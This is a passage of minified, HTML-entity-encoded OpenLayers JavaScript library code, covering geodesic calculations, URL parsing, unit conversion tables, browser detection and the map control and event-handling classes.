NaN;d=v*(d*d-e*e)/(e*e);c=d/1024*(256+d*(-128+d*(74-47*d)));return(e*(1+d/16384*(4096+d*(-768+d*(320-175*d))))*(t-c*s*(q+c/4*(r*(-1+2*q*q)-c/6*q*(-3+4*s*s)*(-3+4*q*q))))).toFixed(3)/1E3&#125;;OpenLayers.Util.destinationVincenty=function(a,b,c)&#123;var d=OpenLayers.Util,e=d.VincentyConstants,f=e.a,g=e.b,h=e.f,e=a.lon;a=a.lat;var k=d.rad(b);b=Math.sin(k);k=Math.cos(k);a=(1-h)*Math.tan(d.rad(a));var l=1/Math.sqrt(1+a*a),m=a*l,n=Math.atan2(a,k);a=l*b;for(var p=1-a*a,f=p*(f*f-g*g)/(g*g),q=1+f/16384*(4096+f*(-768+f*(320-175*f))),r=f/1024*(256+f*(-128+f*(74-47*f))),f=c/(g*q),s=2*Math.PI;1E-12&lt;Math.abs(f-s);)var t=Math.cos(2*n+f),u=Math.sin(f),v=Math.cos(f),w=r*u*(t+r/4*(v*(-1+2*t*t)-r/6*t*(-3+4*u*u)*(-3+4*t*t))),s=f,f=c/(g*q)+w;c=m*u-l*v*k;g=Math.atan2(m*v+l*u*k,(1-h)*Math.sqrt(a*a+c*c));b=Math.atan2(u*b,l*v-m*u*k);k=h/16*p*(4+h*(4-3*p));t=b-(1-k)*h*a*(f+k*u*(t+k*v*(-1+2*t*t)));Math.atan2(a,-c);return new OpenLayers.LonLat(e+d.deg(t),d.deg(g))&#125;;OpenLayers.Util.getParameters=function(a,b)&#123;b=b||&#123;&#125;;a=null===a||void 0===a?window.location.href:a;var c="";if(OpenLayers.String.contains(a,"?"))var d=a.indexOf("?")+1,c=OpenLayers.String.contains(a,"#")?a.indexOf("#"):a.length,c=a.substring(d,c);for(var d=&#123;&#125;,c=c.split(/[&amp;;]/),e=0,f=c.length;e&lt;f;++e)&#123;var g=c[e].split("=");if(g[0])&#123;var h=g[0];try&#123;h=decodeURIComponent(h)&#125;catch(k)&#123;h=unescape(h)&#125;g=(g[1]||"").replace(/\+/g," ");try&#123;g=decodeURIComponent(g)&#125;catch(l)&#123;g=unescape(g)&#125;!1!==b.splitArgs&amp;&amp;(g=g.split(","));1==g.length&amp;&amp;(g=g[0]);d[h]=g&#125;&#125;return d&#125;;OpenLayers.Util.lastSeqID=0;OpenLayers.Util.createUniqueID=function(a)&#123;a=null==a?"id_":a.replace(OpenLayers.Util.dotless,"_");OpenLayers.Util.lastSeqID+=1;return a+OpenLayers.Util.lastSeqID&#125;;OpenLayers.INCHES_PER_UNIT=&#123;inches:1,ft:12,mi:63360,m:39.37,km:39370,dd:4374754,yd:36&#125;;OpenLayers.INCHES_PER_UNIT["in"]=OpenLayers.INCHES_PER_UNIT.inches;OpenLayers.INCHES_PER_UNIT.degrees=OpenLayers.INCHES_PER_UNIT.dd;OpenLayers.INCHES_PER_UNIT.nmi=1852*OpenLayers.INCHES_PER_UNIT.m;OpenLayers.METERS_PER_INCH=0.0254000508001016;OpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,&#123;Inch:OpenLayers.INCHES_PER_UNIT.inches,Meter:1/OpenLayers.METERS_PER_INCH,Foot:0.3048006096012192/OpenLayers.METERS_PER_INCH,IFoot:0.3048/OpenLayers.METERS_PER_INCH,ClarkeFoot:0.3047972651151/OpenLayers.METERS_PER_INCH,SearsFoot:0.30479947153867626/OpenLayers.METERS_PER_INCH,GoldCoastFoot:0.3047997101815088/OpenLayers.METERS_PER_INCH,IInch:0.0254/OpenLayers.METERS_PER_INCH,MicroInch:2.54E-5/OpenLayers.METERS_PER_INCH,Mil:2.54E-8/OpenLayers.METERS_PER_INCH,Centimeter:0.01/OpenLayers.METERS_PER_INCH,Kilometer:1E3/OpenLayers.METERS_PER_INCH,Yard:0.9144018288036576/OpenLayers.METERS_PER_INCH,SearsYard:0.914398414616029/OpenLayers.METERS_PER_INCH,IndianYard:0.9143985307444408/OpenLayers.METERS_PER_INCH,IndianYd37:0.91439523/OpenLayers.METERS_PER_INCH,IndianYd62:0.9143988/OpenLayers.METERS_PER_INCH,IndianYd75:0.9143985/OpenLayers.METERS_PER_INCH,IndianFoot:0.30479951/OpenLayers.METERS_PER_INCH,IndianFt37:0.30479841/OpenLayers.METERS_PER_INCH,IndianFt62:0.3047996/OpenLayers.METERS_PER_INCH,IndianFt75:0.3047995/OpenLayers.METERS_PER_INCH,Mile:1609.3472186944373/OpenLayers.METERS_PER_INCH,IYard:0.9144/OpenLayers.METERS_PER_INCH,IMile:1609.344/OpenLayers.METERS_PER_INCH,NautM:1852/OpenLayers.METERS_PER_INCH,"Lat-66":110943.31648893273/OpenLayers.METERS_PER_INCH,"Lat-83":110946.25736872235/OpenLayers.METERS_PER_INCH,Decimeter:0.1/OpenLayers.METERS_PER_INCH,Millimeter:0.001/OpenLayers.METERS_PER_INCH,Dekameter:10/OpenLayers.METERS_PER_INCH,Decameter:10/OpenLayers.METERS_PER_INCH,Hectometer:100/OpenLayers.METERS_PER_INCH,GermanMeter:1.0000135965/OpenLayers.METERS_PER_INCH,CaGrid:0.999738/OpenLayers.METERS_PER_INCH,ClarkeChain:20.1166194976/OpenLayers.METERS_PER_INCH,GunterChain:20.11684023368047/OpenLayers.METERS_PER_INCH,BenoitChain:20.116782494375872/OpenLayers.METERS_PER_INCH,SearsChain:20.11676512155/OpenLayers.METERS_PER_INCH,ClarkeLink:0.201166194976/OpenLayers.METERS_PER_INCH,GunterLink:0.2011684023368047/OpenLayers.METERS_PER_INCH,BenoitLink:0.20116782494375873/OpenLayers.METERS_PER_INCH,SearsLink:0.2011676512155/OpenLayers.METERS_PER_INCH,Rod:5.02921005842012/OpenLayers.METERS_PER_INCH,IntnlChain:20.1168/OpenLayers.METERS_PER_INCH,IntnlLink:0.201168/OpenLayers.METERS_PER_INCH,Perch:5.02921005842012/OpenLayers.METERS_PER_INCH,Pole:5.02921005842012/OpenLayers.METERS_PER_INCH,Furlong:201.1684023368046/OpenLayers.METERS_PER_INCH,Rood:3.778266898/OpenLayers.METERS_PER_INCH,CapeFoot:0.3047972615/OpenLayers.METERS_PER_INCH,Brealey:375/OpenLayers.METERS_PER_INCH,ModAmFt:0.304812252984506/OpenLayers.METERS_PER_INCH,Fathom:1.8288/OpenLayers.METERS_PER_INCH,"NautM-UK":1853.184/OpenLayers.METERS_PER_INCH,"50kilometers":5E4/OpenLayers.METERS_PER_INCH,"150kilometers":15E4/OpenLayers.METERS_PER_INCH&#125;);OpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,&#123;mm:OpenLayers.INCHES_PER_UNIT.Meter/1E3,cm:OpenLayers.INCHES_PER_UNIT.Meter/100,dm:100*OpenLayers.INCHES_PER_UNIT.Meter,km:1E3*OpenLayers.INCHES_PER_UNIT.Meter,kmi:OpenLayers.INCHES_PER_UNIT.nmi,fath:OpenLayers.INCHES_PER_UNIT.Fathom,ch:OpenLayers.INCHES_PER_UNIT.IntnlChain,link:OpenLayers.INCHES_PER_UNIT.IntnlLink,"us-in":OpenLayers.INCHES_PER_UNIT.inches,"us-ft":OpenLayers.INCHES_PER_UNIT.Foot,"us-yd":OpenLayers.INCHES_PER_UNIT.Yard,"us-ch":OpenLayers.INCHES_PER_UNIT.GunterChain,"us-mi":OpenLayers.INCHES_PER_UNIT.Mile,"ind-yd":OpenLayers.INCHES_PER_UNIT.IndianYd37,"ind-ft":OpenLayers.INCHES_PER_UNIT.IndianFt37,"ind-ch":20.11669506/OpenLayers.METERS_PER_INCH&#125;);OpenLayers.DOTS_PER_INCH=72;OpenLayers.Util.normalizeScale=function(a)&#123;return 1&lt;a?1/a:a&#125;;OpenLayers.Util.getResolutionFromScale=function(a,b)&#123;var c;a&amp;&amp;(null==b&amp;&amp;(b="degrees"),c=1/(OpenLayers.Util.normalizeScale(a)*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH));return c&#125;;OpenLayers.Util.getScaleFromResolution=function(a,b)&#123;null==b&amp;&amp;(b="degrees");return a*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH&#125;;OpenLayers.Util.pagePosition=function(a)&#123;var b=[0,0],c=OpenLayers.Util.getViewportElement();if(!a||a==window||a==c)return b;var d=OpenLayers.IS_GECKO&amp;&amp;document.getBoxObjectFor&amp;&amp;"absolute"==OpenLayers.Element.getStyle(a,"position")&amp;&amp;(""==a.style.top||""==a.style.left),e=null;if(a.getBoundingClientRect)a=a.getBoundingClientRect(),e=window.pageYOffset||c.scrollTop,b[0]=a.left+(window.pageXOffset||c.scrollLeft),b[1]=a.top+e;else if(document.getBoxObjectFor&amp;&amp;!d)a=document.getBoxObjectFor(a),c=document.getBoxObjectFor(c),b[0]=a.screenX-c.screenX,b[1]=a.screenY-c.screenY;else&#123;b[0]=a.offsetLeft;b[1]=a.offsetTop;e=a.offsetParent;if(e!=a)for(;e;)b[0]+=e.offsetLeft,b[1]+=e.offsetTop,e=e.offsetParent;c=OpenLayers.BROWSER_NAME;if("opera"==c||"safari"==c&amp;&amp;"absolute"==OpenLayers.Element.getStyle(a,"position"))b[1]-=document.body.offsetTop;for(e=a.offsetParent;e&amp;&amp;e!=document.body;)&#123;b[0]-=e.scrollLeft;if("opera"!=c||"TR"!=e.tagName)b[1]-=e.scrollTop;e=e.offsetParent&#125;&#125;return b&#125;;OpenLayers.Util.getViewportElement=function()&#123;var a=arguments.callee.viewportElement;void 0==a&amp;&amp;(a="msie"==OpenLayers.BROWSER_NAME&amp;&amp;"CSS1Compat"!=document.compatMode?document.body:document.documentElement,arguments.callee.viewportElement=a);return a&#125;;OpenLayers.Util.isEquivalentUrl=function(a,b,c)&#123;c=c||&#123;&#125;;OpenLayers.Util.applyDefaults(c,&#123;ignoreCase:!0,ignorePort80:!0,ignoreHash:!0,splitArgs:!1&#125;);a=OpenLayers.Util.createUrlObject(a,c);b=OpenLayers.Util.createUrlObject(b,c);for(var d in a)if("args"!==d&amp;&amp;a[d]!=b[d])return!1;for(d in a.args)&#123;if(a.args[d]!=b.args[d])return!1;delete b.args[d]&#125;for(d in b.args)return!1;return!0&#125;;OpenLayers.Util.createUrlObject=function(a,b)&#123;b=b||&#123;&#125;;if(!/^\w+:\/\//.test(a))&#123;var c=window.location,d=c.port?":"+c.port:"",d=c.protocol+"//"+c.host.split(":").shift()+d;0===a.indexOf("/")?a=d+a:(c=c.pathname.split("/"),c.pop(),a=d+c.join("/")+"/"+a)&#125;b.ignoreCase&amp;&amp;(a=a.toLowerCase());c=document.createElement("a");c.href=a;d=&#123;&#125;;d.host=c.host.split(":").shift();d.protocol=c.protocol;d.port=b.ignorePort80?"80"==c.port||"0"==c.port?"":c.port:""==c.port||"0"==c.port?"80":c.port;d.hash=b.ignoreHash||"#"===c.hash?"":c.hash;var e=c.search;e||(e=a.indexOf("?"),e=-1!=e?a.substr(e):"");d.args=OpenLayers.Util.getParameters(e,&#123;splitArgs:b.splitArgs&#125;);d.pathname="/"==c.pathname.charAt(0)?c.pathname:"/"+c.pathname;return d&#125;;OpenLayers.Util.removeTail=function(a)&#123;var b=null,b=a.indexOf("?"),c=a.indexOf("#");return b=-1==b?-1!=c?a.substr(0,c):a:-1!=c?a.substr(0,Math.min(b,c)):a.substr(0,b)&#125;;OpenLayers.IS_GECKO=function()&#123;var a=navigator.userAgent.toLowerCase();return-1==a.indexOf("webkit")&amp;&amp;-1!=a.indexOf("gecko")&#125;();OpenLayers.CANVAS_SUPPORTED=function()&#123;var a=document.createElement("canvas");return!(!a.getContext||!a.getContext("2d"))&#125;();OpenLayers.BROWSER_NAME=function()&#123;var a="",b=navigator.userAgent.toLowerCase();-1!=b.indexOf("opera")?a="opera":-1!=b.indexOf("msie")?a="msie":-1!=b.indexOf("safari")?a="safari":-1!=b.indexOf("mozilla")&amp;&amp;(a=-1!=b.indexOf("firefox")?"firefox":"mozilla");return a&#125;();OpenLayers.Util.getBrowserName=function()&#123;return OpenLayers.BROWSER_NAME&#125;;OpenLayers.Util.getRenderedDimensions=function(a,b,c)&#123;var d,e,f=document.createElement("div");f.style.visibility="hidden";for(var g=c&amp;&amp;c.containerElement?c.containerElement:document.body,h=!1,k=null,l=g;l&amp;&amp;"body"!=l.tagName.toLowerCase();)&#123;var m=OpenLayers.Element.getStyle(l,"position");if("absolute"==m)&#123;h=!0;break&#125;else if(m&amp;&amp;"static"!=m)break;l=l.parentNode&#125;!h||0!==g.clientHeight&amp;&amp;0!==g.clientWidth||(k=document.createElement("div"),k.style.visibility="hidden",k.style.position="absolute",k.style.overflow="visible",k.style.width=document.body.clientWidth+"px",k.style.height=document.body.clientHeight+"px",k.appendChild(f));f.style.position="absolute";b&amp;&amp;(b.w?(d=b.w,f.style.width=d+"px"):b.h&amp;&amp;(e=b.h,f.style.height=e+"px"));c&amp;&amp;c.displayClass&amp;&amp;(f.className=c.displayClass);b=document.createElement("div");b.innerHTML=a;b.style.overflow="visible";if(b.childNodes)for(a=0,c=b.childNodes.length;a&lt;c;a++)b.childNodes[a].style&amp;&amp;(b.childNodes[a].style.overflow="visible");f.appendChild(b);k?g.appendChild(k):g.appendChild(f);d||(d=parseInt(b.scrollWidth),f.style.width=d+"px");e||(e=parseInt(b.scrollHeight));f.removeChild(b);k?(k.removeChild(f),g.removeChild(k)):g.removeChild(f);return new OpenLayers.Size(d,e)&#125;;OpenLayers.Util.getScrollbarWidth=function()&#123;var a=OpenLayers.Util._scrollbarWidth;if(null==a)&#123;var b=null,c=null,b=a=0,b=document.createElement("div");b.style.position="absolute";b.style.top="-1000px";b.style.left="-1000px";b.style.width="100px";b.style.height="50px";b.style.overflow="hidden";c=document.createElement("div");c.style.width="100%";c.style.height="200px";b.appendChild(c);document.body.appendChild(b);a=c.offsetWidth;b.style.overflow="scroll";b=c.offsetWidth;document.body.removeChild(document.body.lastChild);OpenLayers.Util._scrollbarWidth=a-b;a=OpenLayers.Util._scrollbarWidth&#125;return a&#125;;OpenLayers.Util.getFormattedLonLat=function(a,b,c)&#123;c||(c="dms");a=(a+540)%360-180;var d=Math.abs(a),e=Math.floor(d),f=d=(d-e)/(1/60),d=Math.floor(d),f=Math.round(10*((f-d)/(1/60))),f=f/10;60&lt;=f&amp;&amp;(f-=60,d+=1,60&lt;=d&amp;&amp;(d-=60,e+=1));10&gt;e&amp;&amp;(e="0"+e);e+="\u00b0";0&lt;=c.indexOf("dm")&amp;&amp;(10&gt;d&amp;&amp;(d="0"+d),e+=d+"'",0&lt;=c.indexOf("dms")&amp;&amp;(10&gt;f&amp;&amp;(f="0"+f),e+=f+'"'));return e="lon"==b?e+(0&gt;a?OpenLayers.i18n("W"):OpenLayers.i18n("E")):e+(0&gt;a?OpenLayers.i18n("S"):OpenLayers.i18n("N"))&#125;;OpenLayers.Format=OpenLayers.Class(&#123;options:null,externalProjection:null,internalProjection:null,data:null,keepData:!1,initialize:function(a)&#123;OpenLayers.Util.extend(this,a);this.options=a&#125;,destroy:function()&#123;&#125;,read:function(a)&#123;throw Error("Read not implemented.");&#125;,write:function(a)&#123;throw Error("Write not implemented.");&#125;,CLASS_NAME:"OpenLayers.Format"&#125;);OpenLayers.Format.CSWGetRecords=function(a)&#123;a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetRecords.DEFAULTS);var b=OpenLayers.Format.CSWGetRecords["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSWGetRecords version: "+a.version;return new b(a)&#125;;OpenLayers.Format.CSWGetRecords.DEFAULTS=&#123;version:"2.0.2"&#125;;OpenLayers.Control=OpenLayers.Class(&#123;id:null,map:null,div:null,type:null,allowSelection:!1,displayClass:"",title:"",autoActivate:!1,active:null,handlerOptions:null,handler:null,eventListeners:null,events:null,initialize:function(a)&#123;this.displayClass=this.CLASS_NAME.replace("OpenLayers.","ol").replace(/\./g,"");OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners);null==this.id&amp;&amp;(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"))&#125;,destroy:function()&#123;this.events&amp;&amp;(this.eventListeners&amp;&amp;this.events.un(this.eventListeners),this.events.destroy(),this.events=null);this.eventListeners=null;this.handler&amp;&amp;(this.handler.destroy(),this.handler=null);if(this.handlers)&#123;for(var a in this.handlers)this.handlers.hasOwnProperty(a)&amp;&amp;"function"==typeof this.handlers[a].destroy&amp;&amp;this.handlers[a].destroy();this.handlers=null&#125;this.map&amp;&amp;(this.map.removeControl(this),this.map=null);this.div=null&#125;,setMap:function(a)&#123;this.map=a;this.handler&amp;&amp;this.handler.setMap(a)&#125;,draw:function(a)&#123;null==this.div&amp;&amp;(this.div=OpenLayers.Util.createDiv(this.id),this.div.className=this.displayClass,this.allowSelection||(this.div.className+=" olControlNoSelect",this.div.setAttribute("unselectable","on",0),this.div.onselectstart=OpenLayers.Function.False),""!=this.title&amp;&amp;(this.div.title=this.title));null!=a&amp;&amp;(this.position=a.clone());this.moveTo(this.position);return this.div&#125;,moveTo:function(a)&#123;null!=a&amp;&amp;null!=this.div&amp;&amp;(this.div.style.left=a.x+"px",this.div.style.top=a.y+"px")&#125;,activate:function()&#123;if(this.active)return!1;this.handler&amp;&amp;this.handler.activate();this.active=!0;this.map&amp;&amp;OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,"")+"Active");this.events.triggerEvent("activate");return!0&#125;,deactivate:function()&#123;return this.active?(this.handler&amp;&amp;this.handler.deactivate(),this.active=!1,this.map&amp;&amp;OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,"")+"Active"),this.events.triggerEvent("deactivate"),!0):!1&#125;,CLASS_NAME:"OpenLayers.Control"&#125;);OpenLayers.Control.TYPE_BUTTON=1;OpenLayers.Control.TYPE_TOGGLE=2;OpenLayers.Control.TYPE_TOOL=3;OpenLayers.Event=&#123;observers:!1,KEY_SPACE:32,KEY_BACKSPACE:8,KEY_TAB:9,KEY_RETURN:13,KEY_ESC:27,KEY_LEFT:37,KEY_UP:38,KEY_RIGHT:39,KEY_DOWN:40,KEY_DELETE:46,element:function(a)&#123;return a.target||a.srcElement&#125;,isSingleTouch:function(a)&#123;return a.touches&amp;&amp;1==a.touches.length&#125;,isMultiTouch:function(a)&#123;return a.touches&amp;&amp;1&lt;a.touches.length&#125;,isLeftClick:function(a)&#123;return a.which&amp;&amp;1==a.which||a.button&amp;&amp;1==a.button&#125;,isRightClick:function(a)&#123;return a.which&amp;&amp;3==a.which||a.button&amp;&amp;2==a.button&#125;,stop:function(a,b)&#123;b||OpenLayers.Event.preventDefault(a);a.stopPropagation?a.stopPropagation():a.cancelBubble=!0&#125;,preventDefault:function(a)&#123;a.preventDefault?a.preventDefault():a.returnValue=!1&#125;,findElement:function(a,b)&#123;for(var c=OpenLayers.Event.element(a);c.parentNode&amp;&amp;(!c.tagName||c.tagName.toUpperCase()!=b.toUpperCase());)c=c.parentNode;return c&#125;,observe:function(a,b,c,d)&#123;a=OpenLayers.Util.getElement(a);d=d||!1;"keypress"==b&amp;&amp;(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.attachEvent)&amp;&amp;(b="keydown");this.observers||(this.observers=&#123;&#125;);if(!a._eventCacheID)&#123;var e="eventCacheID_";a.id&amp;&amp;(e=a.id+"_"+e);a._eventCacheID=OpenLayers.Util.createUniqueID(e)&#125;e=a._eventCacheID;this.observers[e]||(this.observers[e]=[]);this.observers[e].push(&#123;element:a,name:b,observer:c,useCapture:d&#125;);a.addEventListener?a.addEventListener(b,c,d):a.attachEvent&amp;&amp;a.attachEvent("on"+b,c)&#125;,stopObservingElement:function(a)&#123;a=OpenLayers.Util.getElement(a)._eventCacheID;this._removeElementObservers(OpenLayers.Event.observers[a])&#125;,_removeElementObservers:function(a)&#123;if(a)for(var b=a.length-1;0&lt;=b;b--)&#123;var c=a[b];OpenLayers.Event.stopObserving.apply(this,[c.element,c.name,c.observer,c.useCapture])&#125;&#125;,stopObserving:function(a,b,c,d)&#123;d=d||!1;a=OpenLayers.Util.getElement(a);var e=a._eventCacheID;"keypress"==b&amp;&amp;(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.detachEvent)&amp;&amp;(b="keydown");var f=!1,g=OpenLayers.Event.observers[e];if(g)for(var h=0;!f&amp;&amp;h&lt;g.length;)&#123;var k=g[h];if(k.name==b&amp;&amp;k.observer==c&amp;&amp;k.useCapture==d)&#123;g.splice(h,1);0==g.length&amp;&amp;delete OpenLayers.Event.observers[e];f=!0;break&#125;h++&#125;f&amp;&amp;(a.removeEventListener?a.removeEventListener(b,c,d):a&amp;&amp;a.detachEvent&amp;&amp;a.detachEvent("on"+b,c));return f&#125;,unloadCache:function()&#123;if(OpenLayers.Event&amp;&amp;OpenLayers.Event.observers)&#123;for(var a in OpenLayers.Event.observers)OpenLayers.Event._removeElementObservers.apply(this,[OpenLayers.Event.observers[a]]);OpenLayers.Event.observers=!1&#125;&#125;,CLASS_NAME:"OpenLayers.Event"&#125;;OpenLayers.Event.observe(window,"unload",OpenLayers.Event.unloadCache,!1);OpenLayers.Events=OpenLayers.Class(&#123;BROWSER_EVENTS:"mouseover mouseout mousedown mouseup mousemove click dblclick rightclick dblrightclick resize focus blur touchstart touchmove touchend keydown".split(" "),listeners:null,object:null,element:null,eventHandler:null,fallThrough:null,includeXY:!1,extensions:null,extensionCount:null,clearMouseListener:null,initialize:function(a,b,c,d,e)&#123;OpenLayers.Util.extend(this,e);this.object=a;this.fallThrough=d;this.listeners=&#123;&#125;;this.extensions=&#123;&#125;;this.extensionCount=&#123;&#125;;this._msTouches=[];null!=b&amp;&amp;this.attachToElement(b)&#125;,destroy:function()&#123;for(var a in this.extensions)"boolean"!==typeof this.extensions[a]&amp;&amp;this.extensions[a].destroy();this.extensions=null;this.element&amp;&amp;(OpenLayers.Event.stopObservingElement(this.element),this.element.hasScrollEvent&amp;&amp;OpenLayers.Event.stopObserving(window,"scroll",this.clearMouseListener));this.eventHandler=this.fallThrough=this.object=this.listeners=this.element=null&#125;,addEventType:function(a)&#123;&#125;,attachToElement:function(a)&#123;this.element?OpenLayers.Event.stopObservingElement(this.element):(this.eventHandler=OpenLayers.Function.bindAsEventListener(this.handleBrowserEvent,this),this.clearMouseListener=OpenLayers.Function.bind(this.clearMouseCache,this));this.element=a;for(var b=!!window.navigator.msMaxTouchPoints,c,d=0,e=this.BROWSER_EVENTS.length;d&lt;e;d++)c=this.BROWSER_EVENTS[d],OpenLayers.Event.observe(a,c,this.eventHandler),b&amp;&amp;0===c.indexOf("touch")&amp;&amp;this.addMsTouchListener(a,c,this.eventHandler);OpenLayers.Event.observe(a,"dragstart",OpenLayers.Event.stop)&#125;,on:function(a)&#123;for(var b in a)"scope"!=b&amp;&amp;a.hasOwnProperty(b)&amp;&amp;this.register(b,a.scope,a[b])&#125;,register:function(a,b,c,d)&#123;a in OpenLayers.Events&amp;&amp;!this.extensions[a]&amp;&amp;(this.extensions[a]=new OpenLayers.Events[a](this));if(null!=c)&#123;null==b&amp;&amp;(b=this.object);var e=this.listeners[a];e||(e=[],this.listeners[a]=e,this.extensionCount[a]=0);b=&#123;obj:b,func:c&#125;;d?(e.splice(this.extensionCount[a],0,b),"object"===typeof d&amp;&amp;d.extension&amp;&amp;this.extensionCount[a]++):e.push(b)&#125;&#125;,registerPriority:function(a,b,c)&#123;this.register(a,b,c,!0)&#125;,un:function(a)&#123;for(var b in a)"scope"!=b&amp;&amp;a.hasOwnProperty(b)&amp;&amp;this.unregister(b,a.scope,a[b])&#125;,unregister:function(a,b,c)&#123;null==b&amp;&amp;(b=this.object);a=this.listeners[a];if(null!=a)for(var d=0,e=a.length;d&lt;e;d++)if(a[d].obj==b&amp;&amp;a[d].func==c)&#123;a.splice(d,1);break&#125;&#125;,remove:function(a)&#123;null!=this.listeners[a]&amp;&amp;(this.listeners[a]=[])&#125;,triggerEvent:function(a,b)&#123;var c=this.listeners[a];if(c&amp;&amp;0!=c.length)&#123;null==b&amp;&amp;(b=&#123;&#125;);b.object=this.object;b.element=this.element;b.type||(b.type=a);for(var c=c.slice(),d,e=0,f=c.length;e&lt;f&amp;&amp;(d=c[e],d=d.func.apply(d.obj,[b]),void 0==d||!1!=d);e++);this.fallThrough||OpenLayers.Event.stop(b,!0);return d&#125;&#125;,handleBrowserEvent:function(a)&#123;var b=a.type,c=this.listeners[b];if(c&amp;&amp;0!=c.length)&#123;if((c=a.touches)&amp;&amp;c[0])&#123;for(var d=0,e=0,f=c.length,g,h=0;h&lt;f;++h)g=this.getTouchClientXY(c[h]),d+=g.clientX,e+=g.clientY;a.clientX=d/f;a.clientY=e/f&#125;this.includeXY&amp;&amp;(a.xy=this.getMousePosition(a));this.triggerEvent(b,a)&#125;&#125;,getTouchClientXY:function(a)&#123;var b=window.olMockWin||window,c=b.pageXOffset,b=b.pageYOffset,d=a.clientX,e=a.clientY;if(0===a.pageY&amp;&amp;Math.floor(e)&gt;Math.floor(a.pageY)||0===a.pageX&amp;&amp;Math.floor(d)&gt;Math.floor(a.pageX))d-=c,e-=b;else if(e&lt;a.pageY-b||d&lt;a.pageX-c)d=a.pageX-c,e=a.pageY-b;a.olClientX=d;a.olClientY=e;return&#123;clientX:d,clientY:e&#125;&#125;,clearMouseCache:function()&#123;this.element.scrolls=null;this.element.lefttop=null;this.element.offsets=null&#125;,getMousePosition:function(a)&#123;this.includeXY?this.element.hasScrollEvent||(OpenLayers.Event.observe(window,"scroll",this.clearMouseListener),this.element.hasScrollEvent=!0):this.clearMouseCache();if(!this.element.scrolls)&#123;var b=OpenLayers.Util.getViewportElement();this.element.scrolls=[window.pageXOffset||b.scrollLeft,window.pageYOffset||b.scrollTop]&#125;this.element.lefttop||(this.element.lefttop=[document.documentElement.clientLeft||0,document.documentElement.clientTop||0]);this.element.offsets||(this.element.offsets=OpenLayers.Util.pagePosition(this.element));return new OpenLayers.Pixel(a.clientX+this.element.scrolls[0]-this.element.offsets[0]-this.element.lefttop[0],a.clientY+this.element.scrolls[1]-this.element.offsets[1]-this.element.lefttop[1])&#125;,addMsTouchListener:function(a,b,c)&#123;function d(a)&#123;c(OpenLayers.Util.applyDefaults(&#123;stopPropagation:function()&#123;for(var a=e.length-1;0&lt;=a;--a)e[a].stopPropagation()&#125;,preventDefault:function()&#123;for(var a=e.length-1;0&lt;=a;--a)e[a].preventDefault()&#125;,type:b&#125;,a))&#125;var e=this._msTouches;switch(b)&#123;case "touchstart":return this.addMsTouchListenerStart(a,b,d);case "touchend":return this.addMsTouchListenerEnd(a,b,d);case "touchmove":return this.addMsTouchListenerMove(a,b,d);default:throw"Unknown touch event type";&#125;&#125;,addMsTouchListenerStart:function(a,b,c)&#123;var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerDown",function(a)&#123;for(var b=!1,g=0,h=d.length;g&lt;h;++g)if(d[g].pointerId==a.pointerId)&#123;b=!0;break&#125;b||d.push(a);a.touches=d.slice();c(a)&#125;);OpenLayers.Event.observe(a,"MSPointerUp",function(a)&#123;for(var b=0,c=d.length;b&lt;c;++b)if(d[b].pointerId==a.pointerId)&#123;d.splice(b,1);break&#125;&#125;)&#125;,addMsTouchListenerMove:function(a,b,c)&#123;var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerMove",function(a)&#123;if(a.pointerType!=a.MSPOINTER_TYPE_MOUSE||0!=a.buttons)if(1!=d.length||d[0].pageX!=a.pageX||d[0].pageY!=a.pageY)&#123;for(var b=0,g=d.length;b&lt;g;++b)if(d[b].pointerId==a.pointerId)&#123;d[b]=a;break&#125;a.touches=d.slice();c(a)&#125;&#125;)&#125;,addMsTouchListenerEnd:function(a,b,c)&#123;var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerUp",function(a)&#123;for(var b=0,g=d.length;b&lt;g;++b)if(d[b].pointerId==a.pointerId)&#123;d.splice(b,1);break&#125;a.touches=d.slice();c(a)&#125;)&#125;,CLASS_NAME:"OpenLayers.Events"&#125;);OpenLayers.Events.buttonclick=OpenLayers.Class(&#123;target:null,events:"mousedown mouseup click dblclick touchstart touchmove touchend keydown".split(" "),startRegEx:/^mousedown|touchstart$/,cancelRegEx:/^touchmove$/,completeRegEx:/^mouseup|touchend$/,initialize:function(a)&#123;this.target=a;for(a=this.events.length-1;0&lt;=a;--a)this.target.register(this.events[a],this,this.buttonClick,&#123;extension:!0&#125;)&#125;,destroy:function()&#123;for(var a=this.events.length-1;0&lt;=a;--a)this.target.unregister(this.events[a],this,this.buttonClick);delete this.target&#125;,getPressedButton:function(a)&#123;var b=3,c;do&#123;if(OpenLayers.Element.hasClass(a,"olButton"))&#123;c=a;break&#125;a=a.parentNode&#125;while(0&lt;--b&amp;&amp;a);return c&#125;,ignore:function(a)&#123;var b=3,c=!1;do&#123;if("a"===a.nodeName.toLowerCase())&#123;c=!0;break&#125;a=a.parentNode&#125;while(0&lt;--b&amp;&amp;a);return c&#125;,buttonClick:function(a)&#123;var b=!0,c=OpenLayers.Event.element(a);if(c&amp;&amp;(OpenLayers.Event.isLeftClick(a)||!~a.type.indexOf("mouse")))if(c=this.getPressedButton(c))&#123;if("keydown"===a.type)switch(a.keyCode)&#123;case OpenLayers.Event.KEY_RETURN:case OpenLayers.Event.KEY_SPACE:this.target.triggerEvent("buttonclick",&#123;buttonElement:c&#125;),OpenLayers.Event.stop(a),b=!1&#125;else if(this.startEvt)&#123;if(this.completeRegEx.test(a.type))&#123;var 